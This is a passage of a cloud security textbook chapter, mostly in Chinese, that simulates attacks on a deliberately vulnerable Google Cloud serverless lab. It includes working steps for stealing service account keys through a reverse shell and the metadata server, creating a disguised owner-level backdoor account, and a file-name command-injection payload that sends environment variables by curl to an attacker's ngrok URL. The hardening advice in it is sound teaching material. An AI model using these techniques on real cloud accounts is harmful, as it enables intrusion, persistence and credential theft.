- "## Chapter 10. Setting Up Backdoors and Escalating Privileges in Google Cloud\n\
  \n在上一章中，你了解了攻击者如何利用恶意文件上传来破坏事件驱动的文件处理工作流。在本章中，你将探索从此类攻击获得的初始访问权限如何被利用来设置后门、提升权限并破坏其他云资源。在此基础上，你将研究攻击者可以在\
  \ Google Cloud 环境中绕过限制并执行权限提升所使用的各种技术。\n\n\n\n\n\n更具体地说，你将首先设置一个较低的请求超时，以限制攻击者在反向\
  \ shell 会话中运行恶意命令的时间窗口。在模拟攻击者如何调整其技术以规避这些限制之后，你将把易受攻击的 Cloud Run 服务的请求超时设置进一步降低到\
  \ 10 秒，并降低相关服务账号的权限，以避免在易受攻击的服务被入侵时攻击者立即获得所有者级别的权限。在对无服务器实验室环境实施这些更改后，你将模拟攻击者绕过新的限制并配置后门服务账号以保持持久访问。你随后将探索攻击者可能用来利用配置错误并在\
  \ Google Cloud 账号中提升权限的多种策略和方法。\n\n本章分为以下几个部分：\n\n*   “设置较低的 Cloud Run 服务超时”\n*\
  \   “生成与受损 Cloud Run 服务关联的服务账号密钥”\n*   “配置后门服务账号”\n*   “进一步降低 Cloud Run 超时并限制服务账号权限”\n\
  *   “在没有反向 shell 的情况下利用 Cloud Run 服务”\n*   “通过 Cloud Run 函数提升权限”\n*   “通过 Compute\
  \ Engine VM 实例提升权限”\n\n到本章结束时，你将明白强制执行最小权限原则对于最大限度降低受损云资源的影响至关重要。你也将更好地识别可能被攻击者利用的配置错误和薄弱的安全控制。\n\
  \n### Reviewing Technical Prerequisites\n\n对于本章，你将继续使用来自 Chapter 9 的两个 Google Cloud\
  \ 账号：Serverless Lab 账号用于托管易受攻击的按设计实验室环境，以及 Attacker 账号用于模拟攻击和测试安全控制。保持两个账号在单独的浏览器会话（或隐身/隐私窗口）中打开，以避免会话冲突。\n\
  \n#### Note\n\n为了帮助你完成练习和模拟，本章使用的代码和命令的副本可在 [GitHub gist（见 `ch10.md`）](https://oreil.ly/0mSPU)\
  \ 中获得。\n\n### Setting a Lower Cloud Run Service Timeout\n\n在上一章中，你能够建立反向 shell 连接并运行各种命令来检查无服务器实验室环境中的云资源。由于受损的\
  \ Cloud Run 服务配置了 20 分钟的执行超时，你有足够的时间在建立的连接上执行恶意命令、枚举资源并外泄敏感数据。实际上，执行超时设置可能要低得多，这限制了在建立的反向\
  \ shell 会话中执行命令或探索资源的时间窗口。在本节中，你将配置 Cloud Run 服务使用较低的执行超时，以探索这将如何限制攻击者在反向 shell\
  \ 会话期间可以执行的操作。\n\n#### Note\n\n本节假定你正在使用你的 Serverless Lab 账号，该账号托管易受攻击的按设计无服务器实验室环境。\n\
  \n让我们现在更新已部署 Cloud Run 服务的超时设置：\n\n1. 切换回打开 Serverless Lab 账号 Google Cloud 控制台的浏览器窗口。\n\
  2. 点击 Google Cloud 控制台右上角的 Activate Cloud Shell 按钮以打开 Cloud Shell 终端。\n3. 检索并检查当前\
  \ Google Cloud 项目 ID：\n\n```\ncd ~\nPROJECT_ID=$(gcloud config get-value project)\n\
  [[ -z \"$PROJECT_ID\" ]] && echo \"Error: PROJECT_ID is not set.\"\n```\n\n如果运行这些命令后没有收到错误，这意味着你的\
  \ `PROJECT_ID` 已在环境中正确配置。否则，运行 `gcloud auth login` 并确保通过 `gcloud config set project\
  \ [PROJECT_ID]` 配置了正确的项目，然后再继续下一步。\n\n4. 列出当前项目中的所有 Cloud Run 服务：\n\n```\ngcloud\
  \ run services list\n```\n\n这会产生以下输出：\n\n```\n✔\nSERVICE: html-to-pdf-service\n\
  REGION: us-east1\nURL: https://html-to-pdf-service-....us-east1.run.app\nLAST DEPLOYED\
  \ BY: user@email.com\nLAST DEPLOYED AT: 2025-00-00T00:00:00\n```\n\n5. 检索已部署 Cloud\
  \ Run 服务的名称并将其存储在变量中：\n\n```\nread RUN_SERVICE RUN_REGION < <(gcloud run services\
  \ list \\\n  --format=\"value(name,region)\" | grep '^html-to-pdf')\n```\n\n6. 显示\
  \ Cloud Run 服务的配置和状态：\n\n```\ngcloud run services describe $RUN_SERVICE --region=$RUN_REGION\n\
  ```\n\n这会返回以下内容：\n\n```\n✔ Service html-to-pdf-service in region us-east1\n\nURL:\
  \     https://html-to-pdf-service-....us-east1.run.app\nIngress: all\nTraffic:\n\
  \  100% LATEST (currently html-to-pdf-service-00001-...)\n\nScaling: Auto (Min:\
  \ 0)\n\nLast updated on 2025-00-00T00:00:00.000000Z by user@email.com:\n  Revision\
  \ html-to-pdf-service-00001-abc\n  Container None\n    Image:           .../html-to-pdf-service\n\
  \    Port:            8080\n    Memory:          512Mi\n    CPU:             1000m\n\
  \    Env vars:\n      OUTPUT_BUCKET  ss-output-bucket-...\n    Startup Probe:\n\
  \      TCP every 240s\n      Port:          8080\n      Initial delay: 0s\n    \
  \  Timeout:       240s\n      Failure threshold: 1\n      Type:          Default\n\
  \  Service account:   html-to-pdf@....iam.gserviceaccount.com\n  Concurrency:  \
  \     1\n  Max instances:     1\n  Timeout:           1200s\n```\n\n7. 将指定的 Cloud\
  \ Run 服务的超时更新为 120 秒：\n\n```\ngcloud run services update $RUN_SERVICE \\\n  --region=$RUN_REGION\
  \ \\\n  --timeout=120\n```\n\n这会返回以下内容：\n\n```\nOK Deploying... Done.\n  OK Creating\
  \ Revision...\n  OK Routing traffic...\nDone.\nService [html-to-pdf-service] revision\
  \ [html-to-pdf-service-...]\nhas been deployed and is serving 100 percent of traffic.\n\
  Service URL: https://html-to-pdf-service-....us-east1.run.app\n```\n\n8. 验证 Cloud\
  \ Run 服务是否已使用新的超时设置进行更新：\n\n```\ngcloud run services describe $RUN_SERVICE \\\n\
  \  --region=$RUN_REGION\n```\n\n你应该得到以下输出响应：\n\n```\n✔ Service html-to-pdf-service\
  \ in region us-east1\n\nURL:     https://html-to-pdf-service-....us-east1.run.app\n\
  \n...\n\nLast updated on 2025-00-00T00:00:00.000000Z by user@email.com:\n  Revision\
  \ html-to-pdf-service-00002-def\n  Container None\n    ...\n  Max instances:   \
  \  1\n  Timeout:           120s\n```\n\n\n\n\n\n你已成功将易受攻击的 Cloud Run 服务的超时设置降低到\
  \ 120 秒（2 分钟）。在阅读本章各节时，你会意识到，仅降低 Cloud Run 服务请求超时是不够的，无法完全防止熟练且有决心的攻击者攻击无服务器应用程序。\n\
  \n### 生成与受损 Cloud Run 服务关联的服务账号密钥\n\n在本节中，你将模拟攻击者探索另一种攻击变体，并从反向 shell 生成服务账号密钥以维持访问权限。借助此密钥，你可以以与受损\
  \ Cloud Run 服务关联的服务账号身份进行身份验证，并在反向 shell 会话之外访问项目资源。\n\n在动手操作之前，让我们先讨论几个关键术语：\n\n\
  Service account\n\n: \n\nGoogle Cloud 身份，用于应用程序或服务（如 Cloud Run 服务）向 Google Cloud\
  \ API 进行身份验证，并根据分配给它的 IAM 角色访问资源。\n\nService account key\n\n: \n\n通常为 JSON 格式的文件，其中包含服务账号的凭据。它使外部应用程序或工具能够以服务账号身份进行身份验证并继承其权限，因此必须安全存储和处理以防止未经授权的访问。\n\
  \n#### Note\n\n本节假设你正在使用你的 Attacker 账号，你将用它来模拟攻击者对托管在 Serverless Lab 账号中的实验环境资源执行操作。\n\
  \n让我们开始模拟：\n\n1. 切换回浏览器窗口和 Cloud Shell 终端标签页，其中通过从 VM 实例内部运行的 Netcat 监听器建立了反向 shell\
  \ 会话。\n\n2. 按 CTRL-C 并在 VM 实例内部重新启动你的 Netcat 监听器（`nc -lvnp 4444`）。按 CTRL-C 后，如果在等待几分钟后\
  \ SSH 连接丢失，请使用另一个终端标签页中的 `gcloud compute ssh` 命令重新连接到 VM 实例并重新启动监听器。\n\n3. 重新上传带有构造的恶意文件名的文件（在另一个\
  \ Cloud Shell 标签页中）以重新建立连接。在 Attacker 账号的另一个 Cloud Shell 终端标签页中，将你之前准备的同一文件上传到设计的输入存储桶：\n\
  \n```\nFILENAME=index*\ngsutil cp -- \"$FILENAME\" gs://$INPUT_BUCKET/\n```\n\n\
  文件上传后几秒钟，你应该会看到连接已建立。\n\n4. 一旦反向 shell 连接已建立，运行以下命令（在 `root@localhost:/app#` 之后）以从实例元数据服务器检索服务账号电子邮件并将其存储在变量中：\n\
  \n```\nMD_URL=\"http://169.254.169.254/computeMetadata/v1\"\n\nSA_EMAIL=$(curl -s\
  \ -H \"Metadata-Flavor: Google\" \\\n    \"$MD_URL/instance/service-accounts/default/email\"\
  )\n\necho $SA_EMAIL\n```\n\n这会给出以下输出：\n\n```\nhtml-to-pdf@....iam.gserviceaccount.com\n\
  ```\n\n生成新的服务账号密钥然后将其保存到本地：\n\n```\ngcloud iam service-accounts keys create /tmp/sa-key.json\
  \ \\\n  --iam-account=$SA_EMAIL\n```\n\n这会产生以下输出：\n\n```\ncreated key [...] of type\
  \ [json] as [/tmp/sa-key.json] for\n [html-to-pdf@....iam.gserviceaccount.com]\n\
  ```\n\n运行以下命令以检查 `sa-key.json` 的内容：\n\n```\ncat /tmp/sa-key.json\n```\n\n这会给出以下\
  \ JSON 输出：\n\n```\n{\n  \"type\": \"service_account\",\n  \"project_id\": \"...\"\
  ,\n  \"private_key_id\": \"...\",\n  \"private_key\": \"...\",\n  \"client_email\"\
  : \"html-to-pdf@....iam.gserviceaccount.com\",\n  \"client_id\": \"...\",\n  \"\
  auth_uri\": \"https://accounts.google.com/o/oauth2/auth\",\n  \"token_uri\": \"\
  https://oauth2.googleapis.com/token\",\n  \"auth_provider_x509_cert_url\": \"...\"\
  ,\n  \"client_x509_cert_url\": \"...\",\n  \"universe_domain\": \"googleapis.com\"\
  \n}\n```\n\n将上一步的 JSON 输出复制到剪贴板中。^(1)\n\n5. 在 Attacker 账号中创建一个新的 Cloud Shell 终端标签页并运行以下命令（在\
  \ `$` 符号之后）以创建一个名为 `sa-key.json` 的空文件，用于保存服务账号密钥：\n\n```\ntouch sa-key.json\n```\n\
  \n6. 点击 Open Editor 以启动 Cloud Shell Editor。\n\n7. 使用你之前复制的输出更新 `sa-key.json` 文件。继续操作前请确保保存文件。\n\
  \n8. 点击 Open Terminal。\n\n9. 运行以下命令以使用 `sa-key.json` 文件以受损 Cloud Run 服务使用的服务账号身份进行身份验证：\n\
  \n```\nexport SA_CREDENTIALS=\"sa-key.json\"\ngcloud auth activate-service-account\
  \ \\\n  --key-file=$SA_CREDENTIALS\n\nPROJECT_ID=$(cat sa-key.json | jq -r \".project_id\"\
  )\ngcloud config set project $PROJECT_ID\n```\n\n这会产生以下输出：\n\n```\nActivated service\
  \ account credentials for:\n[html-to-pdf@....iam.gserviceaccount.com]\n\nUpdated\
  \ property [core/project].\n```\n\n10. 列出服务账号可访问的所有 Google Cloud 项目：\n\n```\ngcloud\
  \ projects list\n```\n\n这会返回在 Serverless Lab 账号中创建的项目的 ID、名称和编号：\n\n```\nPROJECT_ID:\
  \ ...\nNAME: ...\nPROJECT_NUMBER: ...\n```\n\n11. 列出当前 `gcloud` 配置中所有活动的已认证账号：\n\
  \n```\ngcloud auth list\n```\n\n这会产生以下输出：\n\n```\nCredentialed Accounts\n\n...\n\
  \nACTIVE: *\nACCOUNT: html-to-pdf@....iam.gserviceaccount.com\n\nTo set the active\
  \ account, run:\n    $ gcloud config set account `ACCOUNT`\n```\n\n12. 以 JSON 格式检索\
  \ IAM 策略：\n\n```\ngcloud projects get-iam-policy $PROJECT_ID --format=json\n```\n\
  \n这会产生以下输出：\n\n```\n{\n  \"bindings\": [\n    ...\n    {\n      \"members\": [\n\
  \        \"serviceAccount:html-to-pdf@....iam.gserviceaccount.com\",\n        \"\
  user:...\"\n      ],\n      \"role\": \"roles/owner\"\n    },\n    ...\n  ],\n \
  \ \"etag\": \"...\",\n  \"version\": 1\n}\n```\n\n13. 检索与受损服务账号关联的属性和详细信息：\n\n```\n\
  gcloud iam service-accounts describe \\\n  $(gcloud config get-value account)\n\
  ```\n\n这会返回以下内容：\n\n```\nYour active configuration is: [cloudshell-1234]\ndisplayName:\
  \ Cloud Run HTML to PDF Service Account\nemail: html-to-pdf@....iam.gserviceaccount.com\n\
  etag: ...\nname: projects/.../serviceAccounts/html-to-pdf@....iam.gserviceaccount.com\n\
  oauth2ClientId: '...'\nprojectId: ...\nuniqueId: '...'\n```\n\n14. 列出项目中所有唯一的资源类型：\n\
  \n```\ngcloud asset search-all-resources \\\n  --project=\"$PROJECT_ID\" \\\n  --format=\"\
  value(assetType)\" | sort | uniq\n```\n\n这会产生以下输出：\n\n```\nartifactregistry.googleapis.com/DockerImage\n\
  artifactregistry.googleapis.com/Repository\ncloudbilling.googleapis.com/ProjectBillingInfo\n\
  cloudresourcemanager.googleapis.com/Project\ndataplex.googleapis.com/EntryGroup\n\
  eventarc.googleapis.com/Trigger\n...\n```\n\n15. 让我们检查你是否能够访问无服务器实验环境中的其他资源。\n\n\
  列出项目中的所有存储桶名称：\n\n```\ngcloud storage buckets list \\\n  --project=$PROJECT_ID \\\
  \n  --format=\"value(name)\"\n```\n\n这会输出以下内容：\n\n```\n...\nss-another-bucket-...\n\
  ss-input-bucket-...\nss-output-bucket-...\n```\n\n列出项目中的所有参数：\n\n\n\n\n\n```\ngcloud\
  \ parametermanager parameters list \\\n  --project=$PROJECT_ID \\\n  --location=global\
  \ \\\n  --format=\"value(name)\"\n```\n\n这应该返回：\n\n```\nprojects/.../locations/global/parameters/param-000\n\
  ```\n\n此时，你应该能够使用服务账号密钥进行身份验证并探索其他项目资源。从防御性安全角度来看，确保服务账号仅具有执行其任务所需的最小权限非常重要。避免授予可能在密钥被泄露时被滥用的过度访问权限。\n\
  \n### 配置后门服务账号\n\n在本节中，你将模拟攻击者配置一个服务账号，该账号将作为未来访问无服务器实验室环境资源的持久后门。借助此后门，即使之前的漏洞和配置错误已被修复，攻击者仍会有一种方式访问环境。你可以将后门服务账号视为安全建筑中所有房间的主钥匙，即使访问控制已更改，入侵者仍可获得持久访问权限。\n\
  \n#### Note\n\n本节假设你使用的是 Attacker 账号，你将使用该账号来模拟攻击者对托管在 Serverless Lab 账号中的实验室环境执行操作。\n\
  \n让我们继续模拟并逐步了解创建后门服务账号的过程：\n\n1. 在前一节中继续进行并列出项目中的所有服务账号：\n\n```\ngcloud iam service-accounts\
  \ list \\\n  --project=$PROJECT_ID \\\n  --format=\"value(name)\"\n```\n\n这会产生以下输出：\n\
  \n```\n...\nprojects/.../serviceAccounts/html-to-pdf@....iam.gserviceaccount.com\n\
  ```\n\n2. 将活动的 Google Cloud 项目设置为指定的项目 ID：\n\n```\ngcloud config set project $PROJECT_ID\n\
  ```\n\n3. 创建一个名为 `system-update-agent` 的新服务账号：\n\n```\ngcloud iam service-accounts\
  \ create system-update-agent \\\n  --description=\"Handles routine system updates\"\
  \ \\\n  --display-name=\"System Update Agent\"\n```\n\n你应该收到以下确认消息：\n\n```\nCreated\
  \ service account [system-update-agent].\n```\n\n#### Note\n\n攻击者经常创建具有通用或听起来像操作性的名称的服务账号（例如\
  \ `system-update-agent`、`backup-service` 或 `monitoring-task`），以使其看起来合法并与正常操作融为一体。\n\
  \n4. 向 `system-update-agent` 服务账号授予 `roles/owner` 角色：\n\n```\nNAME=\"system-update-agent\"\
  \n\ngcloud projects add-iam-policy-binding $PROJECT_ID \\\n  --member=\"serviceAccount:$NAME@$PROJECT_ID.iam.gserviceaccount.com\"\
  \ \\\n  --role=\"roles/owner\"\n```\n\n5. 生成新的服务账号密钥然后将其保存在本地：\n\n```\ngcloud iam\
  \ service-accounts keys create ~/sys-update-key.json \\\n  --iam-account=$NAME@$PROJECT_ID.iam.gserviceaccount.com\n\
  ```\n\n这会输出以下内容：\n\n```\ncreated key [...] of type [json] as [/home/.../sys-update-key.json]\n\
  for [system-update-agent@....iam.gserviceaccount.com]\n```\n\n此时，你拥有一个生成的密钥，可使用\
  \ `gcloud auth activate-service-account` 与其配合使用以冒充 `system-update-agent` 账号。\n\n\
  #### Note\n\n从攻击者的角度来看，此密钥提供了一种通过使用服务账号维持对环境的访问方式，而无需再次利用原始漏洞和配置错误。\n\n请记住，攻击者还可以通过其他方式建立后门。例如，他们可能会部署一个\
  \ rogue Cloud Run 函数或服务，在被调用时返回有效凭据以重新获得访问权限。他们还可能启动具有提升 IAM 权限的 VM，并在需要重新建立访问权限时通过\
  \ SSH 登录到该 VM，从元数据服务器检索令牌或生成新密钥。\n\n从防御性安全角度来看，你应定期审计所有项目是否存在意外或过度特权的服务账号、密钥和其他资源。重要的是检查这些资源何时创建，按定期计划轮换凭据，并通过自动化警报审查活动日志以识别可疑或未经授权的操作。你还应修复攻击者在设置持久性机制（例如\
  \ rogue 账号、计划作业或策略更改）之前可能利用的任何现有漏洞或配置错误。解决这些差距并强制执行最小权限原则可降低攻击者再次进入环境的风险。\n\n###\
  \ 进一步减少 Cloud Run 超时并限制服务账号权限\n\n即使请求超时设置为两分钟，你也亲眼看到攻击者仍可在反向 shell 会话中运行恶意命令并规避超时设置引入的限制。在本节中，你将进一步将\
  \ Cloud Run 服务请求超时设置减少到 10 秒，如 Figure 10-1 所示。\n\n![](img/lsse_1001.png)\n\n这将帮助你确认大幅减少的超时配置是否足以防止攻击者成功利用有意设计为易受攻击的应用程序。此外，你将减少与\
  \ Cloud Run 服务关联的服务账号的权限，以防止在服务被入侵时攻击者立即获得所有者级别权限。\n\n#### Note\n\n本节假设你使用的是你的 Serverless\
  \ Lab 账号，该账号托管着易受攻击的无服务器实验室环境。\n\n让我们现在继续对服务应用超时和权限更改：\n\n1. 切换回用于设置易受攻击的无服务器实验室环境的\
  \ Serverless Lab 账号的 Google Cloud 控制台浏览器窗口。\n\n2. 在 Cloud Shell 终端中（在 `$` 符号之后），检索已部署的\
  \ Cloud Run 服务名称并将其存储在变量中：\n\n```\nread RUN_SERVICE RUN_REGION < <(gcloud run services\
  \ list \\\n  --format=\"value(name,region)\" | grep '^html-to-pdf')\n```\n\n3. 显示\
  \ Cloud Run 服务的配置和状态：\n\n```\ngcloud run services describe $RUN_SERVICE --region=$RUN_REGION\n\
  ```\n\n这会产生以下输出：\n\n```\n✔ Service html-to-pdf-service in region us-east1\n\n...\n\
  \nLast updated on 2025-00-00T00:00:00.000000Z by user@email.com:\n  Revision html-to-pdf-service-00001-abc\n\
  \n  ...\n\n  Service account:   html-to-pdf@....iam.gserviceaccount.com\n  Concurrency:\
  \       1\n  Max instances:     1\n  Timeout:           120s\n```\n\n在这里，你可以看到 Cloud\
  \ Run 服务当前的请求超时设置为 120 秒。\n\n4. 为 Cloud Run 服务配置 10 秒超时限制：\n\n```\ngcloud run services\
  \ update $RUN_SERVICE \\\n  --region=$RUN_REGION \\\n  --timeout=10\n```\n\n这会产生以下输出：\n\
  \n```\nOK Deploying... Done.\n  OK Creating Revision...\n  OK Routing traffic...\n\
  Done.\nService [html-to-pdf-service] revision [html-to-pdf-service-...]\nhas been\
  \ deployed and is serving 100 percent of traffic.\nService URL: https://html-to-pdf-service-....us-east1.run.app\n\
  ```\n\n5. 让我们验证 Cloud Run 服务是否已使用新的超时设置进行更新：\n\n```\ngcloud run services describe\
  \ $RUN_SERVICE \\\n  --region=$RUN_REGION\n```\n\n你应该得到以下输出响应：\n\n\n\n\n\n```\n\
  ✔ Service html-to-pdf-service in region us-east1\n\nURL:     https://html-to-pdf-service-....us-east1.run.app\n\
  \n...\n\nLast updated on 2025-00-00T00:00:00.000000Z by user@email.com:\n  Revision\
  \ html-to-pdf-service-00002-def\n  Container None\n    ...\n  Max instances:   \
  \  1\n  Timeout:           10s\n```\n\n6. 为项目启用所需的 Google Cloud 服务：\n\n```\ngcloud\
  \ services enable \\\n  translate.googleapis.com \\\n  vision.googleapis.com \\\n\
  \  cloudfunctions.googleapis.com \\\n  eventarc.googleapis.com \\\n  run.googleapis.com\
  \ \\\n  artifactregistry.googleapis.com \\\n  compute.googleapis.com \\\n  iam.googleapis.com\n\
  ```\n\n7. 初始化你的项目 ID、区域和服务账号邮箱变量：\n\n```\nPROJECT_ID=$(gcloud config get-value project)\n\
  REGION=\"us-east1\"\nSA_NAME=\"html-to-pdf\"\nSA_EMAIL=\"$SA_NAME@$PROJECT_ID.iam.gserviceaccount.com\"\
  \n```\n\n8. 删除当前分配给与 Cloud Run 服务关联的指定服务账号的所有 IAM 角色：^(2)\n\n```\nfor ROLE in $(gcloud\
  \ projects get-iam-policy \"$PROJECT_ID\" \\\n  --flatten=\"bindings[].members\"\
  \ \\\n  --format='value(bindings.role)' \\\n  --filter=\"bindings.members:serviceAccount:$SA_EMAIL\"\
  ); do\n    echo \"Removing $ROLE from $SA_EMAIL\"\n    gcloud projects remove-iam-policy-binding\
  \ \"$PROJECT_ID\" \\\n      --member=\"serviceAccount:$SA_EMAIL\" \\\n      --role=\"\
  $ROLE\" \\\n      --quiet\ndone\n```\n\n9. 向与 Cloud Run 服务关联的服务账号授予以下 IAM 角色：`roles/editor`、`roles/iam.serviceAccountUser`\
  \ 和 `roles/run.admin`：\n\n```\ngcloud projects add-iam-policy-binding \"$PROJECT_ID\"\
  \ \\\n  --member=\"serviceAccount:$SA_EMAIL\" \\\n  --role=\"roles/editor\"\n\n\
  gcloud projects add-iam-policy-binding \"$PROJECT_ID\" \\\n  --member=\"serviceAccount:$SA_EMAIL\"\
  \ \\\n  --role=\"roles/iam.serviceAccountUser\"\n\ngcloud projects add-iam-policy-binding\
  \ \"$PROJECT_ID\" \\\n  --member=\"serviceAccount:$SA_EMAIL\" \\\n  --role=\"roles/run.admin\"\
  \n```\n\n10. 列出分配给服务账号的所有 IAM 角色：\n\n```\ngcloud projects get-iam-policy $PROJECT_ID\
  \ \\\n  --flatten=\"bindings[].members\" \\\n  --format='table(bindings.role)' \\\
  \n  --filter=\"bindings.members:$SA_EMAIL\"\n```\n\n这将产生以下输出：\n\n```\nROLE: roles/editor\n\
  \nROLE: roles/iam.serviceAccountUser\n\nROLE: roles/run.admin\n```\n\n11. 创建一个名为\
  \ `superadmin` 的新服务账号：\n\n```\nSA_NAME=\"superadmin\"\nSA_EMAIL=\"$SA_NAME@$PROJECT_ID.iam.gserviceaccount.com\"\
  \n\ngcloud iam service-accounts create \"$SA_NAME\" \\\n  --project=\"$PROJECT_ID\"\
  \ \\\n  --display-name=\"$SA_NAME\"\n```\n\n12. 等待大约一分钟，然后授予该服务账号在项目中的 `roles/owner`\
  \ 角色：\n\n```\ngcloud projects add-iam-policy-binding \"$PROJECT_ID\" \\\n  --member=\"\
  serviceAccount:$SA_EMAIL\" \\\n  --role=\"roles/owner\"\n```\n\n#### Note\n\n如果收到\
  \ `ERROR: Policy modification failed.` 错误消息，请在重试命令前再等待几分钟。\n\n13. 运行以下命令，然后将存储桶名称复制到本地机器上的文本编辑器以供以后参考：\n\
  \n```\ncat ~/bucket-vars.sh\n```\n\n此时，你的易受攻击的按需无服务器环境已配置了更短的 Cloud Run 请求超时和更受限制的服务账号，减少了服务的执行窗口并限制了其可使用的权限。虽然你可能会认为这些更改已足够，但一个有决心的攻击者可以调整其方法来规避本节中引入的限制。\n\
  \n### 在没有反向 Shell 的情况下利用 Cloud Run 服务\n\n在前一节中，你使用相对更安全的配置升级了事件驱动的文件处理应用程序。但你会看到，即使有这些改进，攻击者仍会找到利用漏洞和配置错误并提升权限以获得所有者级权限的方法。在本节中，你将模拟攻击者技术，这些技术不依赖反向\
  \ Shell 来从易受攻击的 Cloud Run 服务中外泄环境变量、源代码或服务账号凭据。\n\n为了帮助你深入了解攻击者如何在不使用反向 Shell 的情况下规避限制并外泄敏感数据，本节分为以下几个部分：\n\
  \n*   “设置本地服务器和接收外泄数据的隧道”\n*   “从 Cloud Run 服务外泄环境变量”\n*   “从 Cloud Run 服务外泄源代码”\n\
  *   “从 Cloud Run 服务外泄服务账号凭据”\n\n话不多说，让我们开始吧！\n\n#### 设置本地服务器和接收外泄数据的隧道\n\n在 第 9\
  \ 章 中，你设置了反向 Shell 监听器来处理来自受损 Cloud Run 服务的传入反向 Shell 连接。由于你直到本章末尾才使用反向 Shell，你将改为设置本地服务器以及隧道，以模拟攻击者通过代码注入攻击捕获外泄的数据。\n\
  \n#### Note\n\n本节假设你使用的是本地机器。或者，你也可以在攻击者账号中设置 VM 实例（或使用任何现有实例）。确保网络配置允许端口 8000 和\
  \ 4040。\n\n让我们逐步介绍设置本地服务器和隧道的步骤：\n\n1. 在本地机器上的终端窗口中，运行以下命令以克隆 `request-receiver`\
  \ GitHub 仓库：\n\n```\nGH_USERNAME=learning-serverless-security\nGH_REPO=request-receiver\n\
  \ngit clone https://github.com/$GH_USERNAME/$GH_REPO.git\n\ncd request-receiver\n\
  ```\n\n2. 创建并激活 Python 虚拟环境：\n\n```\npython3 -m venv venv\nsource venv/bin/activate\n\
  ```\n\n3. 安装 `requirements.txt` 中列出的依赖项：\n\n```\npip install -r requirements.txt\n\
  ```\n\n4. 启动应用程序：\n\n```\npython app.py\n```\n\n你应该会看到以下输出，表明 Flask 正在运行并准备接收请求：\n\
  \n```\n* Serving Flask app 'app'\n * Debug mode: off\nWARNING: This is a development\
  \ server. Do not use it in a production deployment. Use a production WSGI server\
  \ instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:8000\n\
  \ * Running on http://192.168.254.159:8000\nPress CTRL+C to quit\n```\n\n#### Note\n\
  \n请确保让此 Flask 服务器保持运行，以确保在后续章节的测试期间可以访问它。\n\n5. 在另一个终端窗口（或标签页）中，通过在端口 8000 上启动 `ngrok`\
  \ 隧道将你的 Flask 服务器暴露到互联网：^(3)\n\n```\nngrok http 8000\n```\n\n这会产生以下输出：\n\n\n\n\n\
  \n```\nngrok\n\n...\n\nSession Status          online\nAccount                 ...\
  \ (Plan: Free)\nVersion                 3.23.3\nRegion                  Asia Pacific\
  \ (ap)\nLatency                 47ms\nWeb Interface           http://127.0.0.1:4040\n\
  Forwarding              https://<ID>.ngrok-free.app -> http://localhost:8000\n\n\
  Connections             ttl     opn     rt1     rt5     p50     p90\n          \
  \              0       0       0.00    0.00    0.00    0.00\n```\n\n#### Note\n\n\
  请务必从 `Forwarding` 部分复制 HTTPS 转发 URL（例如，`https​://<ID>.ngrok-free.app`）。在后续步骤中你需要它来接收本地的\
  \ HTTP 请求。\n\n至此，你已完成设置本地服务器和 `ngrok` 隧道所需的所有步骤，以便在以下部分的模拟中接收被外泄的数据。\n\n#### 从 Cloud\
  \ Run 服务外泄环境变量\n\n本地服务器和 `ngrok` 隧道准备就绪后，让我们通过上传一个带有恶意文件名的文件来模拟代码注入攻击。这次，不会建立反向\
  \ Shell。相反，恶意文件名中的有效载荷将仅通过 `curl` 命令直接将凭据发送到 `ngrok` 隧道。\n\n#### Note\n\n本节假设你使用攻击者账号来模拟攻击者与\
  \ Serverless Lab 账号中的无服务器实验环境资源进行交互。\n\n让我们继续进行模拟：\n\n1. 在攻击者账号的 Cloud Shell 终端中，运行以下命令将输入存储桶的名称存储在\
  \ `INPUT_BUCKET` 变量中：\n\n```\nINPUT_BUCKET=\"[INPUT BUCKET]\"\n```\n\n请务必将 `[INPUT\
  \ BUCKET]` 替换为以 `ss-input-bucket` 开头的指定输入云存储桶名称。\n\n2. 在攻击者账号的 Cloud Shell 终端中，将\
  \ `ngrok` URL 存储在 `NGROK_URL` 变量中：\n\n```\nNGROK_URL=\"https://[ID].ngrok-free.app\"\
  \n```\n\n请务必将 `[ID]` 替换为 `ngrok` 分配的唯一子域名。\n\n3. 构造一个包含命令的恶意文件名，该命令将受损资源环境中的环境变量发送到\
  \ `ngrok` URL：\n\n```\nCOMMAND=\"env | curl -X POST --data-binary @- $NGROK_URL\"\
  \nENCODED=$(echo \"bash -c '$COMMAND'\" | base64 -w0)\nFILENAME=\"index.html; echo\
  \ $ENCODED | base64 -d | bash #.html\"\n```\n\n这里，`@-` 是一个 `curl` 参数，表示“从 stdin\
  \ 读取请求体”。你需要在 `@-` 和 `ngrok` URL 之间留一个空格（即 `--data-binary @- https://...`），以便数据来源参数和目标\
  \ URL 是独立的 shell 参数。如果没有这个空格，URL 将成为同一个 token 的一部分，命令将不会按预期运行。运行这些命令将生成一个包含嵌入式 Base64\
  \ 编码命令的恶意文件名，如果被应用程序执行，将解码并将受损资源的环境变量发送到攻击者控制的 `ngrok` URL。\n\n4. 使用前一步构造的文件名创建文件：\n\
  \n```\ntouch -- \"$FILENAME\"\n```\n\n5. 将文件上传到指定的 Cloud Storage 存储桶：\n\n```\ngsutil\
  \ cp -- \"$FILENAME\" gs://$INPUT_BUCKET/\n```\n\n文件上传后几秒钟，你应该能在 Flask 服务器日志中看到受损\
  \ Cloud Run 服务的环境变量：\n\n```\nPYTHON_SHA256=...\nPYTHON_VERSION=3.10.18\nK_REVISION=vuln-wkhtml-service-...\n\
  SECRET=PASSWORD123\nCLOUD_RUN_TIMEOUT_SECONDS=10\nPWD=/app\nPORT=8080\n...\n```\n\
  \n#### Note\n\n这展示了存储在环境变量中的凭据，例如 `SECRET=PASSWORD123`，如何被攻击者通过恶意文件名和简单的 HTTP 请求外泄。\n\
  \n至此，你应该明白，即使没有建立反向 Shell 连接，攻击者仍可通过恶意文件名和简单的 HTTP 请求直接从环境中外泄敏感凭据。\n\n从防御安全角度来看，避免将凭据存储在环境变量中非常重要，因为如果无服务器函数或计算资源被攻破，攻击者可以轻松外泄它们。除了解决代码注入漏洞外，你还应考虑限制出站网络流量以帮助防止未经授权的数据外泄。\n\
  \n#### 从 Cloud Run 服务外泄源代码\n\n在本节中，你将模拟攻击者在执行代码注入攻击后外泄易受攻击的 Cloud Run 服务源代码。与前一节一样，不会建立反向\
  \ Shell；相反，恶意文件名中的有效载荷将仅通过 `curl` 命令直接将 Cloud Run 服务的源代码发送到 `ngrok` 隧道。\n\n####\
